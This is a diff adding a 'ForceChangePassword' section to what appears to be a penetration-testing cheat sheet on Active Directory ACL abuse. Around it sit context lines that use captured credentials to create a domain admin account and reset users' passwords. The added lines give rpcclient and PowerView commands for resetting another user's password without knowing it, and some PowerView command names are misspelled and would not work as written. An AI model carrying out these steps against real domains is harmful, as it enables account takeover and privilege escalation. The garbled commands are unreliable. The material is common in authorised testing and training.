@@ -41,3 +41,18 @@ Now we got the credentials Objects, let's open a new session with the privileged
 
     1. Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {net user DomainAdminmUser P@ssw0rd1!}
     2. Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -Force)}
+
+### ForceChangePassword
+
+This Dacl means we can change the user's password without knowing his current one.
+
+Change it using rpcclient:
+
+    1. rpcclient -U <username> <ip>
+    2. setuserinfo2 <username-we-can-change-password-to> 23 'NewPassword123!'
+
+Change it using PowerView:
+
+    1. $newpass = ConverTo-SecureString 'Password1234!' -AsPlainText -Force
+    2. SetDomainPassword -Identity smith -AccountPassword $newpass
+
